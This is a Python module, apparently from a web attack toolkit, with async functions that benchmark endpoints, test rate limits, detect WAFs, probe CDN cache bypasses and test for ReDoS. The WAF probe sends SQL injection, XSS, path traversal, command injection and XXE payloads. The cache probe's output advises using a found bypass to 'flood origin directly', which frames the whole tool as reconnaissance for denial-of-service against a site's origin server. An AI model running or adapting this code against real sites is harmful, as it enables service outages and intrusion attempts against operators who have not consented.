from __future__ import annotations

import asyncio
import statistics
import time

import aiohttp

from .state import STATE


async def http_request(
    url: str, method: str = "GET", headers: dict | None = None,
    body: str | None = None, timeout: int = 10, follow_redirects: bool = True,
) -> dict:
    try:
        start = time.monotonic()
        async with aiohttp.ClientSession() as session:
            kwargs: dict = {
                "timeout": aiohttp.ClientTimeout(total=timeout),
                "ssl": False, "allow_redirects": follow_redirects,
            }
            if headers:
                kwargs["headers"] = headers
            if body:
                kwargs["data"] = body
            async with session.request(method, url, **kwargs) as resp:
                elapsed = time.monotonic() - start
                body_bytes = await resp.read()
                STATE.total_requests_sent += 1
                resp_headers = dict(resp.headers)
                return {
                    "status_code": resp.status,
                    "headers": resp_headers,
                    "body_size_bytes": len(body_bytes),
                    "body_preview": body_bytes[:2000].decode(errors="replace"),
                    "response_time_ms": round(elapsed * 1000, 2),
                    "content_type": resp_headers.get("Content-Type", ""),
                    "server": resp_headers.get("Server", "unknown"),
                    "url": str(resp.url),
                }
    except Exception as e:
        return {"error": str(e), "error_type": type(e).__name__}


async def benchmark_endpoint(
    url: str, method: str = "GET", num_requests: int = 20,
    headers: dict | None = None, body: str | None = None,
) -> dict:
    times: list[float] = []
    errors = 0
    statuses: dict[int, int] = {}

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, limit_per_host=0)) as session:
        for _ in range(num_requests):
            try:
                start = time.monotonic()
                kwargs: dict = {"timeout": aiohttp.ClientTimeout(total=10), "ssl": False}
                if headers:
                    kwargs["headers"] = headers
                if body:
                    kwargs["data"] = body
                async with session.request(method, url, **kwargs) as resp:
                    await resp.read()
                    elapsed = (time.monotonic() - start) * 1000
                    times.append(elapsed)
                    statuses[resp.status] = statuses.get(resp.status, 0) + 1
                    STATE.total_requests_sent += 1
            except Exception:
                errors += 1

    if not times:
        return {"error": "all_requests_failed", "total_errors": errors}

    times.sort()
    result = {
        "url": url, "num_requests": num_requests,
        "avg_ms": round(statistics.mean(times), 2),
        "min_ms": round(min(times), 2),
        "max_ms": round(max(times), 2),
        "median_ms": round(statistics.median(times), 2),
        "p95_ms": round(times[int(len(times) * 0.95)], 2),
        "p99_ms": round(times[int(len(times) * 0.99)], 2),
        "std_dev_ms": round(statistics.stdev(times), 2) if len(times) > 1 else 0,
        "error_count": errors,
        "error_rate_pct": round(errors / num_requests * 100, 2),
        "status_distribution": statuses,
    }
    STATE.baseline[url] = result["avg_ms"]
    return result


async def test_rate_limit(url: str, num_requests: int = 100, delay_ms: int = 0) -> dict:
    statuses: dict[int, int] = {}
    blocked_at = None
    times: list[float] = []

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, limit_per_host=0)) as session:
        for i in range(num_requests):
            try:
                start = time.monotonic()
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as resp:
                    elapsed = (time.monotonic() - start) * 1000
                    times.append(elapsed)
                    statuses[resp.status] = statuses.get(resp.status, 0) + 1
                    STATE.total_requests_sent += 1
                    if resp.status == 429 and blocked_at is None:
                        blocked_at = i + 1
                    if delay_ms > 0:
                        await asyncio.sleep(delay_ms / 1000)
            except Exception:
                statuses[-1] = statuses.get(-1, 0) + 1

    return {
        "url": url, "total_sent": num_requests,
        "rate_limited": 429 in statuses,
        "blocked_at_request": blocked_at,
        "status_distribution": statuses,
        "avg_response_ms": round(statistics.mean(times), 2) if times else None,
    }


async def detect_waf(url: str) -> dict:
    payloads = [
        ("sql_injection", "?id=1' OR '1'='1"),
        ("xss_probe", "?q=<script>alert(1)</script>"),
        ("path_traversal", "/../../etc/passwd"),
        ("command_injection", "?cmd=;ls+-la"),
        ("xxe_probe", "?xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"),
    ]

    baseline_resp = await http_request(url)
    baseline_status = baseline_resp.get("status_code", 200)
    results = []
    waf_detected = False
    waf_evidence: list[str] = []

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, limit_per_host=0)) as session:
        for probe_name, payload in payloads:
            test_url = url.rstrip("/") + payload
            try:
                async with session.get(
                    test_url, timeout=aiohttp.ClientTimeout(total=5),
                    ssl=False, allow_redirects=False,
                ) as resp:
                    STATE.total_requests_sent += 1
                    body = await resp.text()
                    blocked = resp.status in (403, 406, 429, 503) and baseline_status not in (403, 406, 429, 503)
                    if not blocked:
                        for sig in ["access denied", "blocked", "firewall", "waf", "captcha", "challenge"]:
                            if sig in body.lower():
                                blocked = True
                                break
                    if blocked:
                        waf_detected = True
                        waf_evidence.append(probe_name)
                    results.append({"probe": probe_name, "status": resp.status, "blocked": blocked})
            except Exception:
                results.append({"probe": probe_name, "error": "request_failed"})

    return {
        "waf_detected": waf_detected,
        "waf_evidence": waf_evidence,
        "probe_results": results,
        "known_waf": STATE.tech_stack.get("waf", "unknown"),
    }


async def probe_cache(url: str) -> dict:
    from urllib.parse import urlparse
    parsed = urlparse(url)

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, limit_per_host=0)) as session:
        start = time.monotonic()
        try:
            async with session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as r:
                baseline_ms = (time.monotonic() - start) * 1000
                baseline_headers = dict(r.headers)
                STATE.total_requests_sent += 1
        except Exception as e:
            return {"error": str(e)}

        cache_headers = {k: baseline_headers.get(k) for k in [
            "Age", "Cache-Control", "X-Cache", "X-Cache-Status",
            "CF-Cache-Status", "X-Served-By", "Via", "ETag", "Vary",
        ] if baseline_headers.get(k)}

        cdn_detected = any(baseline_headers.get(k) for k in ["CF-Cache-Status", "X-Cache", "Via"])

        test_cases = [
            ("random_param", f"{url}?_={int(time.time() * 1000)}", {}),
            ("range_header", url, {"Range": "bytes=0-"}),
            ("accept_encoding_off", url, {"Accept-Encoding": "identity"}),
            ("pragma_no_cache", url, {"Pragma": "no-cache", "Cache-Control": "no-cache"}),
            ("x_forwarded_for", url, {"X-Forwarded-For": "127.0.0.1"}),
        ]

        bypass_tests: dict[str, dict] = {}
        for label, test_url, extra_headers in test_cases:
            try:
                s = time.monotonic()
                async with session.get(
                    test_url, headers=extra_headers or None,
                    ssl=False, timeout=aiohttp.ClientTimeout(total=10),
                ) as r:
                    elapsed = (time.monotonic() - s) * 1000
                    STATE.total_requests_sent += 1
                    cache_miss = elapsed > baseline_ms * 1.4
                    bypass_tests[label] = {
                        "ms": round(elapsed, 2), "status": r.status, "cache_miss": cache_miss,
                    }
            except Exception as ex:
                bypass_tests[label] = {"error": str(ex)}

        bypass_found = any(v.get("cache_miss") for v in bypass_tests.values() if isinstance(v, dict))
        best_bypass = next(
            (label for label, v in bypass_tests.items() if isinstance(v, dict) and v.get("cache_miss")), None
        )

        return {
            "url": url, "baseline_ms": round(baseline_ms, 2),
            "cdn_detected": cdn_detected, "cache_headers": cache_headers,
            "bypass_tests": bypass_tests, "bypass_found": bypass_found,
            "best_bypass_method": best_bypass,
            "recommendation": (
                f"Use '{best_bypass}' to bypass CDN and flood origin directly"
                if bypass_found else "No effective cache bypass found"
            ),
        }


async def redos_probe(url: str, param: str = "q", extra_params: dict | None = None) -> dict:
    payloads = [
        "a" * 30 + "!",
        "a" * 50 + "b",
        "(" * 15 + "a" * 15 + ")" * 15,
        "a" * 100,
        "1" * 50 + "a",
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab",
        "aaaaaaaaaaaaaaaaaaaaaa!",
        "%00" * 20,
        "a" * 200,
    ]

    baseline_times: list[float] = []
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, limit_per_host=0)) as session:
        for _ in range(5):
            params = dict(extra_params or {})
            params[param] = "test"
            try:
                start = time.monotonic()
                async with session.get(url, params=params, ssl=False, timeout=aiohttp.ClientTimeout(total=5)) as r:
                    baseline_times.append((time.monotonic() - start) * 1000)
                    STATE.total_requests_sent += 1
            except Exception:
                pass

        baseline = statistics.mean(baseline_times) if baseline_times else 500.0
        results = []
        for payload in payloads:
            params = dict(extra_params or {})
            params[param] = payload
            try:
                start = time.monotonic()
                async with session.get(url, params=params, ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as r:
                    elapsed = (time.monotonic() - start) * 1000
                    STATE.total_requests_sent += 1
                    results.append({
                        "payload_preview": payload[:40],
                        "response_ms": round(elapsed, 2),
                        "slowdown_factor": round(elapsed / max(baseline, 1), 2),
                        "suspicious": elapsed > baseline * 3,
                    })
            except asyncio.TimeoutError:
                results.append({"payload_preview": payload[:40], "timeout": True, "suspicious": True})
            except Exception as e:
                results.append({"payload_preview": payload[:40], "error": str(e)})

    suspicious = [r for r in results if r.get("suspicious")]
    return {
        "url": url, "param": param, "baseline_ms": round(baseline, 2),
        "results": results, "suspicious_payloads": len(suspicious),
        "vulnerable": len(suspicious) > 0,
        "recommendation": (
            f"{len(suspicious)} payloads caused >3x slowdown — ReDoS likely"
            if suspicious else "No obvious ReDoS detected"
        ),
    }
